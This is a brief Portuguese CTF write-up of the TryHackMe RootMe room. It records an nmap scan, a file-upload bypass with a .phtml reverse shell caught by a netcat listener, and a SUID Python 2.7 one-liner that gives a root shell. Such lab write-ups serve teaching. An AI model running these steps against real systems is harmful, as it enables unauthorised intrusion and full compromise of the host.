# root-me — TryHackMe

```text
[ TARGET ] 10.67.146.47
[ ROOM   ] RootMe
[ GOAL   ] user.txt / root.txt
[ STATUS ] PARTIAL — RCE + vetor privesc; flags não salvas
```

## 01 — Recon (nmap)

```console
$ nmap -sV 10.67.146.47
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

→ Achado: SSH + HTTP. (raw: `recuperado.txt`)
→ Próximo: enum upload / webshell.

## 02 — Upload bypass (.phtml)

```console
$ # php bloqueado no upload → bypass com .phtml
$ # payload: php-reverse-shell.phtml
# LHOST (VPN lab): 192.168.136.19
```

```console
$ nc -n -l -p 1234
# trigger do shell via URL do upload
```

→ Achado: reverse shell via `php-reverse-shell.phtml`.
→ Artefato: `php-reverse-shell.phtml`

## 03 — Privesc (SUID python)

```console
$ /usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# shell com euid elevado (bit -p)
```

→ Achado: Python 2.7 SUID → root shell.
→ Próximo: `cat` user/root flags e registrar abaixo.

## FLAGS / RESPOSTAS

| Item | Valor |
|---|---|
| user.txt | *(completar)* |
| root.txt | *(completar)* |

## Artefatos

`recuperado.txt` · `php-reverse-shell.phtml`
